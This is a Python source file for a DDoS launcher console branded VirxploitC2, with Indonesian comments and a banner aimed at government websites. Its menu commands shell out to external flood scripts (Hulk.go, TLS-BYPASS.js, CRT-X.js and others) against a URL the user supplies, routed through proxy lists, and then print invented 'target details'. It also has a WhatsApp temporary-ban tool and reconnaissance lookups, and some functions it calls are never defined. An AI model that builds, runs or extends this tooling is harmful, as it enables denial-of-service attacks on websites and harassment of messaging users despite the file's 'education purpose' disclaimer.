# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
from colorama import Fore, Back, init
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def examplecrtx():
  print("""\x1b[38;5;40m
  Ex : CRT-X [url] [time]
  """)



def examplecrash():
  print("""\x1b[38;5;40m
  Ex : crash [url] [time]
  """)


def exampletlsv2():
  print("""\x1b[38;5;40m
  Ex : tlsv2 [url] [time]
  """)

def examplebrowser():
  print("""\x1b[38;5;40m
  Ex :  browser [url] [time]
  """)

def exampletls():
  print("""\x1b[38;5;40m
  Ex : tls [url] [time]
  """)



def examplebypass():
  print("""\x1b[38;5;40m
  Ex : bypass [url] [time]
  """)  


def examplehold():
  print("""\x1b[38;5;40m
  Ex : hold [url] [time]
  """)

def examplestrike():
  print("""\x1b[38;5;40m
  Ex : strike [url] [time]
  """)

def menu():
  print('''
\x1b[38;5;40m Help\x1b[0m Visitors:
\x1b[0m - layer7  | best method layer7 to see it
\x1b[0m - rules   | rules and text embedding
\x1b[0m - support | support if you need help
\x1b[0m - tools   | tools that really work and make things easier
\x1b[0m - clear   | clear function returns to the initial display
\x1b[0m - restart | restart turn it off and turn it back on 
''')

def country():
    # Membuat daftar negara dan singkatannya
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
        "Indonesia": "INA",
        # Tambahkan negara lain di sini sesuai kebutuhan
    }
    
    # Memilih secara acak sebuah negara dari daftar
    random_country = random.choice(list(countries.keys()))
    
    # Mengembalikan nama negara dan singkatannya
    return random_country, countries[random_country]

# Fungsi untuk mendapatkan informasi ASN dan ORG secara acak
def get_asn_org():
    # ASN diambil secara acak antara 10000 dan 99999
    asn = random.randint(10000, 99999)
    # Memilih secara acak antara "OVH" dan "Cloudflare Inc."
    org = random.choice(["OVH", "Cloudflare Inc."])
    return str(asn), org

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")

# Mendapatkan hasil dari fungsi country()
nama_negara, singkatan = country()

# Mendapatkan informasi ASN dan ORG secara acak
asn, org = get_asn_org()
                
def support():
  print("""
you can dm me in telegram: \x1b[38;5;160m@Virxploit
""")
def tools():
    print("""
\x1b[38;5;45mreverse ip │ Check Url For ip
\x1b[38;5;46mdns │ Check dns
\x1b[38;5;47mtempban │ Temporary Ban WhatsApp
\x1b[38;5;48msubnet-lookup │ Subnet Lookup
\x1b[38;5;49mreverse-dns │ Reverse Dns 
""")


def rules():
    print("""
\x1b[38;5;45m  1. For education purpose
\x1b[38;5;46m  2. Only attack stress testing servers      
\x1b[38;5;47m  3. Use It Wisely So That There Is No Illegal Impression                   
\x1b[38;5;48m  4. The creator does not do any harm                               
\x1b[38;5;49m  5. Dont trust anyone                                           

""")
    
def layer7():
    print("""
NAME      │ DESCRIPTION       │ DURATION
──────────│───────────────────│───────────
CRTX      │ Layer 7   [XXX]]    │ 300
CRASH     │ Layer 7           │ 300
TLSV2     │ Layer 7 - [XXX]  │ 300
BROWSER   │ Layer 7           │ 300
TLS       │ Layer 7 - [XXX}  │ 300
BYPASS    │ Layer 7        │ 300
HOLD      │ Layer 7 - [XX]]   │ 300
STRIKE    │ Layer 7 - [XXX]]  │ 300
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\x1b[0m
                        WELCOME TO \033[36mVIRXPLOITC2 \x1b[0mSIMPLE DDOS TOOLS
\x1b[38;2;214;4;844m
\x1b[38;5;34m                      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;35m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;36m                 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;37m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;38m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀.                      
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸.     Virxploit 🦅 🇲🇨 
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇.   FUCK WEBSITE PEMERINTAHAN☠️
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀.     
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;39m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;40m             ⠀NOTE : NGGK BUTUH MODAL BACOD !!!⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;41m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;42m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;43m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;44m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;45m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;46m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;47m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;48m                ⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;49m                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[38;5;50m                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[0m
⠀                    ⠀PLEASE TYPE [\x1b[38;5;160mHELP\x1b[0m] Virxploit 🦅 🇲🇨

""")

    while True:
        sys.stdout.write(f"\x1b]2;[-] R3DZX-C2 / User [root] / Expry [Dec 25 2025 / Slot 0/2\x07")
        sin = input(" "+Back.GREEN+Fore.BLACK+" root@StrongC2 "+Fore.RESET+Back.RESET+" ►► ")
        sinput = sin.split(" ")[0]
        if sinput == "restart" or sinput == "restart":
            os.system ("python3 main.py")        
        if sinput == "rules" or sinput == "rules":
            rules()
        if sinput == "clear" or sinput == "CLEAR":
            os.system ("clear")
            main()
        if sinput == "help" or sinput == "HELP":
            menu()
        if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
            layer7()  
        elif sinput == "SUPPORT" or sinput == "support":
            support()
        elif sinput == "TOOLS" or sinput == "tools":
            tools()

#########TOOLS########

        elif sinput == "reverseip":
            try:
                ip = sin.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except ValueError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif sinput == "subnet-lookup":
            try:
                ip = sin.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except ValueError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif sinput == "tempban":
            try:
                code = sin.split()[1]
                target = sin.split()[2]
                os.system(f'node tempban.js {code} {target}')
            except ValueError:
                print('node tempban.js [code] [target]')
            except IndexError:
                print('node tempban.js [code] [target]')
        elif sinput == "dns":
            try:
                domain = sin.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except ValueError:
                    print('Usage: dns <dns>')
                    print('Example: dns google.com')
            except IndexError:
                print('Usage: dns <dns>')
                print('Example: dns google.com')

        elif sinput == "reverse-dns":
            try:
                domain = sin.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={domain}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except ValueError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')

#########LAYER-7########  
        elif sinput == "CRTX" or sinput == "crtx":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd godzilla && node CRT-X.js {url} {time} 10 proxy.txt 32 uam')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m crtx \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")

            except ValueError:
                examplebasic()
            except IndexError:
                examplebasic()

        elif sinput == "CRASH" or sinput == "crash":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd godzilla && go run XCDDOS.go -url {url} -method {time}')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Crash \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplecrash()
            except IndexError:
                examplecrash()
            
        elif sinput == "BROWSER" or sinput == "browser":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                ascii_vro()
                os.system(f'cd godzilla && node tlsv2.js {url} {time} 64 5 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Browser \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplebrowser()
            except IndexError:
                examplebrowser()

        elif sinput == "TLSV3" or sinput == "tlsv3":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd godzilla && node tlsv2.js {url} {time} 64 10 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m TlsV3 \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                exampletlsv3()
            except IndexError:
                exampletlsv3()

        elif sinput == "STRIKE" or sinput == "strike":
            try:
                host = sin.split()[1]
                time  = sin.split()[2]
                os.system(f'cd resources && go run strike.go -url {host} GET')
                os.system(f'cd godzilla && go run Hulk.go -site {host} -data POST')
                os.system(f'cd media && go run Low.go -site {host} -data GET')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {host} {Fore.RESET}
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m STRIKE \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplestrike()
            except IndexError:
                examplestrike()

        elif sinput == "VENOM" or sinput == "venom":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node venom.js {url} {time} 70 10 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Venom \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplevenom()
            except IndexError:
                examplevenom()

        elif sinput == "FLOOD" or sinput == "flood":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node flood.js {url} {time} proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Flood \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                exampleflood()
            except IndexError:
                exampleflood()

        elif sinput == "BYPASS" or sinput == "bypass":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd godzilla && node TLS-BYPASS.js {url} {time} 32 10 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Bypass \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplebypass()
            except IndexError:
                examplebypass()

        elif sinput == "MIX" or sinput == "mix":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'screen -dm node mix.js {url} {time} 100 20 proxy.txt')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Mix \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplemix()
            except IndexError:
                examplemix()

        elif sinput == "HOLD" or sinput == "hold":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd godzilla && go run STRIKE.go -url {url} -method {time}')
                print(f"""
\x1b[38;2;214;4;844m\x1b[38;5;40m   Attack Details:
\x1b[38;2;169;13;846m  \x1b[0m   Status:    
\x1b[38;2;134;20;846m     Host:    [{Fore.GREEN} {url} {Fore.RESET}]
\x1b[38;2;143;18;846m     Port:    [\x1b[38;5;40m 443 \x1b[0m]     
\x1b[38;2;134;20;846m     Time:    [{Fore.GREEN} {time} {Fore.RESET}]
\x1b[38;2;134;20;846m     Method:  [\x1b[38;5;40m Hold \x1b[0m]
\x1b[38;2;134;20;846m     Sent On: [\x1b[38;5;40m {waktu()} \x1b[0m]

\x1b[38;2;214;4;844m    Target Details:
\x1b[38;2;143;18;846m  \x1b[0m   ASN:     [\x1b[38;5;40m {asn} \x1b[0m]
\x1b[38;2;134;20;846m     ORG:     [\x1b[38;5;40m {org} \x1b[0m]
\x1b[38;2;169;13;846m     CONTRY:  [\x1b[38;5;40m {singkatan} \x1b[0m]
""")
            except ValueError:
                examplehold()
            except IndexError:
                examplehold()

def login():
    user = ""
    passwd = ""
    username = input(" 🚀 Username:Virxploit ")
    password = getpass.getpass(prompt='🚀 Password:Virxploit ')
    if username != user or password != passwd:
        print("")
        print("🚀 Wrong Pass.")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🚀 Welcome to Tolls Penzx")
        main()

-login()
